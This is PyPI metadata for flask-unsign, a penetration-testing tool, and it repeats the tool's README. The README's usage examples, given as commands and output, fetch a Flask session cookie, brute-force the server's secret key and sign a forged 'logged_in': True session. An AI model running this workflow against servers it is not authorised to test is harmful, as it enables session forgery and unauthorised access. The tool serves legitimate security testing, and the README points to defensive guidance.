{"info": {"author": "Luke Paris (Paradoxis)", "author_email": "luke@paradoxis.nl", "bugtrack_url": null, "classifiers": ["License :: OSI Approved :: MIT License", "Programming Language :: Python", "Programming Language :: Python :: 3", "Programming Language :: Python :: 3.6", "Programming Language :: Python :: Implementation :: CPython", "Programming Language :: Python :: Implementation :: PyPy"], "description": "# Flask Unsign\n[![Build Status](https://travis-ci.org/Paradoxis/Flask-Unsign.svg?branch=master)](https://travis-ci.org/Paradoxis/Flask-Unsign)\n[![PyPI version](https://badge.fury.io/py/flask-unsign.svg)](https://badge.fury.io/py/flask-unsign)\n[![codecov](https://codecov.io/gh/Paradoxis/Flask-Unsign/branch/master/graph/badge.svg)](https://codecov.io/gh/Paradoxis/Flask-Unsign)\n\nCommand line tool to fetch, decode, brute-force and craft session cookies of a Flask  application by guessing secret keys.\nFor the standalone wordlist component, please visit the [flask-unsign-wordlist](https://github.com/Paradoxis/Flask-Unsign-Wordlist) repository.\n\n## Requirements\n* Python 3.6\n\n## Installation\nTo install the application, simply use pip:\n\n```\n$ pip3 install flask-unsign[wordlist]\n```\n\nIf you only want to install the core code, omit the `[wordlist]` suffix:\n\n``` \n$ pip3 install flask-unsign\n```\n\nTo install the tool for development purposes, run the following command (after downloading a copy):\n\n```\n$ pip3 install -e .[test]\n```\n\n## Usage\n\nTo get an overview of all possible options, simply call flask-unsign without \nany arguments like so:\n\n``` \n$ flask-unsign\n```\n\n### Obtaining & Decoding Session Cookies\nDue to the fact that Flask cookies are **signed** and **not encrypted**, it's \npossible to locally decode the session data. For this, you can use the `--decode` \nargument.\n\nSession cookies can be obtained by inspecting your HTTP requests using a proxy \nlike  Burp Proxy, using your browser's network inspector or using a browser \nextension to view/change your cookies. By default, Flask uses the session name\n`\"session\"`. \n\n```\n$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'\n{'logged_in': False}\n```\n\nYou can also use Flask-Unsign's automatic session grabbing functionality by \npassing the `--server` argument, instead of the `--cookie` argument. *Do note \nhowever, **that not all web pages might return a session**, so be sure to pass an\nurl which does.*\n\n``` \n$ flask-unsign --decode --server 'https://www.example.com/login'\n[*] Server returned HTTP 302 (FOUND)\n[+] Successfully obtained session cookie: eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8\n{'logged_in': False}\n```\n\n### Unsigning (Brute Forcing Secret Keys)\nAfter obtaining a sample session cookie, you'll be able to attempt to brute-force \nthe server's secret key. If you're lucky, this might be set to something easy to \nguess, or if it's been found online, it might be in one of your wordlists. For \nthis, you can use the `--unsign` argument.\n\n``` \n$ flask-unsign --unsign --cookie < cookie.txt\n[*] Session decodes to: {'logged_in': False}\n[*] No wordlist selected, falling back to default wordlist..\n[*] Starting brute-forcer with 8 threads..\n[+] Found secret key after 351 attempts\n'CHANGEME'\n```\n\n### Signing (Session Manipulation)\nOnce you've obtained the server's secret key, you'll be able to craft your own \ncustom session data. For this, you can use the `--sign` argument.\n\n``` \n$ flask-unsign --sign --cookie \"{'logged_in': True}\" --secret 'CHANGEME'\neyJsb2dnZWRfaW4iOnRydWV9.XDuW-g.cPCkFmmeB7qNIcN-ReiN72r0hvU\n``` \n\n## Troubleshooting\n\n* **Installing the program results in an error**\n    * You might be using the wrong `pip` binary, try using\n      the following command: `python3.6 -m pip install flask-unsign`\n* **I found a secret key, but my crafted sessions don't work!**\n    * It might be possible that your target server uses an older version of \n      [itsdangerous](https://github.com/pallets/itsdangerous). Due to \n      [an issue](https://github.com/pallets/itsdangerous/issues/46) with timed \n      sessions, the timestamp generation algorithm was changed. \n      To generate an older signature, try using the `--legacy` option.\n* **My wordlist doesn't work**\n    * Wordlists expect to be newline delimited \n      [python strings](https://docs.python.org/3/library/stdtypes.html#str) \n      (meaning you need to encapsulate them in quotes), this is so that \n      binary strings can easily be stored in a newline format. If you don't want \n      this, you can disable this feature by passing the `--no-literal-eval` \n      argument.\n\n\n## How it works\nIf you're wondering how exactly this works, refer to my \n[blog post](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce) \nwhich explains this in great detail, including a guide on how to protect your own server from this attack.\n\n## License\nMIT License\n\nCopyright (c) 2019 Luke Paris (Paradoxis)\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n", "description_content_type": "text/markdown", "docs_url": null, "download_url": "", "downloads": {"last_day": -1, "last_month": -1, "last_week": -1}, "home_page": "https://github.com/Paradoxis/Flask-Unsign", "keywords": "", "license": "MIT", "maintainer": "", "maintainer_email": "", "name": "flask-unsign", "package_url": "https://pypi.org/project/flask-unsign/", "platform": "", "project_url": "https://pypi.org/project/flask-unsign/", "project_urls": {"Homepage": "https://github.com/Paradoxis/Flask-Unsign"}, "release_url": "https://pypi.org/project/flask-unsign/0.0.3/", "requires_dist": ["flask", "requests", "itsdangerous", "markupsafe", "werkzeug", "twine ; extra == 'dev'", "wheel ; extra == 'dev'", "setuptools (>=40.6.3) ; extra == 'dev'", "coverage ; extra == 'test'", "codecov ; extra == 'test'", "flask-unsign-wordlist ; extra == 'wordlist'"], "requires_python": ">=3.6.0", "summary": "Flask Unsign is a penetration testing utility that attempts to uncover a Flask server's secret key by taking a signed session verifying it against a wordlist of commonly used and publicly known secret keys (sourced from books, GitHub, StackOverflow and various other sources).", "version": "0.0.3", "yanked": false, "html_description": "<div class=\"project-description\">\n            <h1>Flask Unsign</h1>\n<p><a href=\"https://travis-ci.org/Paradoxis/Flask-Unsign\" rel=\"nofollow\"><img alt=\"Build Status\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/01a9b094beb1f4c38868d211fe69f0e71ada7f62/68747470733a2f2f7472617669732d63692e6f72672f50617261646f7869732f466c61736b2d556e7369676e2e7376673f6272616e63683d6d6173746572\"></a>\n<a href=\"https://badge.fury.io/py/flask-unsign\" rel=\"nofollow\"><img alt=\"PyPI version\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/7f5f9c97b7791459b29abe3d754b42530d159ed3/68747470733a2f2f62616467652e667572792e696f2f70792f666c61736b2d756e7369676e2e737667\"></a>\n<a href=\"https://codecov.io/gh/Paradoxis/Flask-Unsign\" rel=\"nofollow\"><img alt=\"codecov\" src=\"https://warehouse-camo.ingress.cmh1.psfhosted.org/beff70742dcede4d2fd7dd1f641f002dbc9130ae/68747470733a2f2f636f6465636f762e696f2f67682f50617261646f7869732f466c61736b2d556e7369676e2f6272616e63682f6d61737465722f67726170682f62616467652e737667\"></a></p>\n<p>Command line tool to fetch, decode, brute-force and craft session cookies of a Flask  application by guessing secret keys.\nFor the standalone wordlist component, please visit the <a href=\"https://github.com/Paradoxis/Flask-Unsign-Wordlist\" rel=\"nofollow\">flask-unsign-wordlist</a> repository.</p>\n<h2>Requirements</h2>\n<ul>\n<li>Python 3.6</li>\n</ul>\n<h2>Installation</h2>\n<p>To install the application, simply use pip:</p>\n<pre><code>$ pip3 install flask-unsign[wordlist]\n</code></pre>\n<p>If you only want to install the core code, omit the <code>[wordlist]</code> suffix:</p>\n<pre><code>$ pip3 install flask-unsign\n</code></pre>\n<p>To install the tool for development purposes, run the following command (after downloading a copy):</p>\n<pre><code>$ pip3 install -e .[test]\n</code></pre>\n<h2>Usage</h2>\n<p>To get an overview of all possible options, simply call flask-unsign without\nany arguments like so:</p>\n<pre><code>$ flask-unsign\n</code></pre>\n<h3>Obtaining &amp; Decoding Session Cookies</h3>\n<p>Due to the fact that Flask cookies are <strong>signed</strong> and <strong>not encrypted</strong>, it's\npossible to locally decode the session data. For this, you can use the <code>--decode</code>\nargument.</p>\n<p>Session cookies can be obtained by inspecting your HTTP requests using a proxy\nlike  Burp Proxy, using your browser's network inspector or using a browser\nextension to view/change your cookies. By default, Flask uses the session name\n<code>\"session\"</code>.</p>\n<pre><code>$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'\n{'logged_in': False}\n</code></pre>\n<p>You can also use Flask-Unsign's automatic session grabbing functionality by\npassing the <code>--server</code> argument, instead of the <code>--cookie</code> argument. <em>Do note\nhowever, <strong>that not all web pages might return a session</strong>, so be sure to pass an\nurl which does.</em></p>\n<pre><code>$ flask-unsign --decode --server 'https://www.example.com/login'\n[*] Server returned HTTP 302 (FOUND)\n[+] Successfully obtained session cookie: eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8\n{'logged_in': False}\n</code></pre>\n<h3>Unsigning (Brute Forcing Secret Keys)</h3>\n<p>After obtaining a sample session cookie, you'll be able to attempt to brute-force\nthe server's secret key. If you're lucky, this might be set to something easy to\nguess, or if it's been found online, it might be in one of your wordlists. For\nthis, you can use the <code>--unsign</code> argument.</p>\n<pre><code>$ flask-unsign --unsign --cookie &lt; cookie.txt\n[*] Session decodes to: {'logged_in': False}\n[*] No wordlist selected, falling back to default wordlist..\n[*] Starting brute-forcer with 8 threads..\n[+] Found secret key after 351 attempts\n'CHANGEME'\n</code></pre>\n<h3>Signing (Session Manipulation)</h3>\n<p>Once you've obtained the server's secret key, you'll be able to craft your own\ncustom session data. For this, you can use the <code>--sign</code> argument.</p>\n<pre><code>$ flask-unsign --sign --cookie \"{'logged_in': True}\" --secret 'CHANGEME'\neyJsb2dnZWRfaW4iOnRydWV9.XDuW-g.cPCkFmmeB7qNIcN-ReiN72r0hvU\n</code></pre>\n<h2>Troubleshooting</h2>\n<ul>\n<li><strong>Installing the program results in an error</strong>\n<ul>\n<li>You might be using the wrong <code>pip</code> binary, try using\nthe following command: <code>python3.6 -m pip install flask-unsign</code></li>\n</ul>\n</li>\n<li><strong>I found a secret key, but my crafted sessions don't work!</strong>\n<ul>\n<li>It might be possible that your target server uses an older version of\n<a href=\"https://github.com/pallets/itsdangerous\" rel=\"nofollow\">itsdangerous</a>. Due to\n<a href=\"https://github.com/pallets/itsdangerous/issues/46\" rel=\"nofollow\">an issue</a> with timed\nsessions, the timestamp generation algorithm was changed.\nTo generate an older signature, try using the <code>--legacy</code> option.</li>\n</ul>\n</li>\n<li><strong>My wordlist doesn't work</strong>\n<ul>\n<li>Wordlists expect to be newline delimited\n<a href=\"https://docs.python.org/3/library/stdtypes.html#str\" rel=\"nofollow\">python strings</a>\n(meaning you need to encapsulate them in quotes), this is so that\nbinary strings can easily be stored in a newline format. If you don't want\nthis, you can disable this feature by passing the <code>--no-literal-eval</code>\nargument.</li>\n</ul>\n</li>\n</ul>\n<h2>How it works</h2>\n<p>If you're wondering how exactly this works, refer to my\n<a href=\"https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce\" rel=\"nofollow\">blog post</a>\nwhich explains this in great detail, including a guide on how to protect your own server from this attack.</p>\n<h2>License</h2>\n<p>MIT License</p>\n<p>Copyright (c) 2019 Luke Paris (Paradoxis)</p>\n<p>Permission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:</p>\n<p>The above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.</p>\n<p>THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.</p>\n\n          </div>"}, "last_serial": 7041050, "releases": {"0.0.1": [{"comment_text": "", "digests": {"md5": "5f3f45601ff211495e2248582da9fd4d", "sha256": "6c09ddfc367e3e108d75f022698af5dc8a6cc0947f315cd6f9044166c41eb53c"}, "downloads": -1, "filename": "flask_unsign-0.0.1-py3-none-any.whl", "has_sig": false, "md5_digest": "5f3f45601ff211495e2248582da9fd4d", "packagetype": "bdist_wheel", "python_version": "py3", "requires_python": ">=3.6.0", "size": 12847, "upload_time": "2019-01-26T11:44:05", "upload_time_iso_8601": "2019-01-26T11:44:05.358374Z", "url": "https://files.pythonhosted.org/packages/3c/db/849396c2fa6e960db26925762060a866fc1b3cfdbfa9e66c7729b4e7c2d9/flask_unsign-0.0.1-py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "e1a39d13fc2e6da66010be3e7bc5cfe2", "sha256": "c2b450e743c58ae6f9624e04c954c1765f069f776a1ca3410b416376a377acd1"}, "downloads": -1, "filename": "flask-unsign-0.0.1.tar.gz", "has_sig": false, "md5_digest": "e1a39d13fc2e6da66010be3e7bc5cfe2", "packagetype": "sdist", "python_version": "source", "requires_python": ">=3.6.0", "size": 13025, "upload_time": "2019-01-26T11:44:07", "upload_time_iso_8601": "2019-01-26T11:44:07.312637Z", "url": "https://files.pythonhosted.org/packages/0b/75/e19f2ff64c46f098890108a5a4efad1a76f92afb1a2bfa01775a6d1f4e33/flask-unsign-0.0.1.tar.gz", "yanked": false}], "0.0.2": [{"comment_text": "", "digests": {"md5": "07cce2a9a5a2d55c064e535c002447dd", "sha256": "7c09cfc3c44fa25525993834f41140585964c9f0cd0789b8bfd95600e4c73ac6"}, "downloads": -1, "filename": "flask_unsign-0.0.2-py3-none-any.whl", "has_sig": false, "md5_digest": "07cce2a9a5a2d55c064e535c002447dd", "packagetype": "bdist_wheel", "python_version": "py3", "requires_python": ">=3.6.0", "size": 13329, "upload_time": "2019-07-19T16:12:12", "upload_time_iso_8601": "2019-07-19T16:12:12.718350Z", "url": "https://files.pythonhosted.org/packages/d8/2e/1996f0f34d8c54b8259f0805c4624df150f9ee32d91ee153cc5aac47dd7d/flask_unsign-0.0.2-py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "10dadd0f1af911d0d455211488d8adeb", "sha256": "64880d735c5d7c2bd0d4c6f5ab9222a273a7bd3699884b847ab36757e1a49233"}, "downloads": -1, "filename": "flask-unsign-0.0.2.tar.gz", "has_sig": false, "md5_digest": "10dadd0f1af911d0d455211488d8adeb", "packagetype": "sdist", "python_version": "source", "requires_python": ">=3.6.0", "size": 13796, "upload_time": "2019-07-19T16:12:14", "upload_time_iso_8601": "2019-07-19T16:12:14.310797Z", "url": "https://files.pythonhosted.org/packages/c4/88/046b8c20a7731256a9e5f447037acdbc661a167ac4810121c319e082ca7e/flask-unsign-0.0.2.tar.gz", "yanked": false}], "0.0.3": [{"comment_text": "", "digests": {"md5": "dd805a218495e8d8e0c6a25a59e9460d", "sha256": "c2fb90084f3978d4e63f77cceaae33fda846b9f496a938681f03d95d6ae13373"}, "downloads": -1, "filename": "flask_unsign-0.0.3-py3-none-any.whl", "has_sig": false, "md5_digest": "dd805a218495e8d8e0c6a25a59e9460d", "packagetype": "bdist_wheel", "python_version": "py3", "requires_python": ">=3.6.0", "size": 13354, "upload_time": "2020-04-17T15:32:18", "upload_time_iso_8601": "2020-04-17T15:32:18.456297Z", "url": "https://files.pythonhosted.org/packages/31/68/93302f2f5033780cf3a32249a83d009eefe5873c688956489229c151612e/flask_unsign-0.0.3-py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "52a503929ecf27e4ba0f23d03cc838ac", "sha256": "c95464a56fb10fb1e1c9d2c9728a28480277de6b2cf7cf6406a55c915e1b763b"}, "downloads": -1, "filename": "flask-unsign-0.0.3.tar.gz", "has_sig": false, "md5_digest": "52a503929ecf27e4ba0f23d03cc838ac", "packagetype": "sdist", "python_version": "source", "requires_python": ">=3.6.0", "size": 13413, "upload_time": "2020-04-17T15:32:19", "upload_time_iso_8601": "2020-04-17T15:32:19.975264Z", "url": "https://files.pythonhosted.org/packages/a7/22/dac3946effd0716281dd397ea60e9a677863f6811d073352854410e4d469/flask-unsign-0.0.3.tar.gz", "yanked": false}]}, "urls": [{"comment_text": "", "digests": {"md5": "dd805a218495e8d8e0c6a25a59e9460d", "sha256": "c2fb90084f3978d4e63f77cceaae33fda846b9f496a938681f03d95d6ae13373"}, "downloads": -1, "filename": "flask_unsign-0.0.3-py3-none-any.whl", "has_sig": false, "md5_digest": "dd805a218495e8d8e0c6a25a59e9460d", "packagetype": "bdist_wheel", "python_version": "py3", "requires_python": ">=3.6.0", "size": 13354, "upload_time": "2020-04-17T15:32:18", "upload_time_iso_8601": "2020-04-17T15:32:18.456297Z", "url": "https://files.pythonhosted.org/packages/31/68/93302f2f5033780cf3a32249a83d009eefe5873c688956489229c151612e/flask_unsign-0.0.3-py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "52a503929ecf27e4ba0f23d03cc838ac", "sha256": "c95464a56fb10fb1e1c9d2c9728a28480277de6b2cf7cf6406a55c915e1b763b"}, "downloads": -1, "filename": "flask-unsign-0.0.3.tar.gz", "has_sig": false, "md5_digest": "52a503929ecf27e4ba0f23d03cc838ac", "packagetype": "sdist", "python_version": "source", "requires_python": ">=3.6.0", "size": 13413, "upload_time": "2020-04-17T15:32:19", "upload_time_iso_8601": "2020-04-17T15:32:19.975264Z", "url": "https://files.pythonhosted.org/packages/a7/22/dac3946effd0716281dd397ea60e9a677863f6811d073352854410e4d469/flask-unsign-0.0.3.tar.gz", "yanked": false}], "timestamp": "Fri May  8 01:02:10 2020"}